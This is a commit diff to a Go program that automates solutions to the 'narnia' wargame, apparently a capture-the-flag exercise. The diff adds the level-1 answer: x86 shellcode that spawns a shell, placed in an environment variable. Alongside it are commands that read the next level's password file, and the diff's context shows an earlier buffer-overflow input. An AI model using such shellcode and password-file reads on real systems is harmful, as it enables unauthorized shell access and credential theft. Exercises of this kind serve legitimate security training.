af71f9767d008638ce8c4b8c6a5cbb0a48815c0d
Michael Woolnough <michael.woolnough@gmail.com>
2017-09-12 18:01:35 +0100

    solution for narnia1

--- narnia/main.go
+++ narnia/main.go
@@ -26,6 +26,11 @@ var (
 			"00000000000000000000" + string([]byte{0xef, 0xbe, 0xad, 0xde}) + "\n",
 			"echo -n \"Password:\";cat /etc/narnia_pass/narnia1;exit\n",
 		},
+		//level 1
+		[]string{
+			"EGG=\"$(printf \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\")\" /narnia/narnia1;exit\n", // Shell Code from http://shell-storm.org/shellcode/files/shellcode-811.php
+			"echo -n \"Password:\";cat /etc/narnia_pass/narnia2;exit\n",
+		},
 	}
 	passwordBytes = []byte("Password:")
 	sValueBytes   = []byte("SVALUE:")
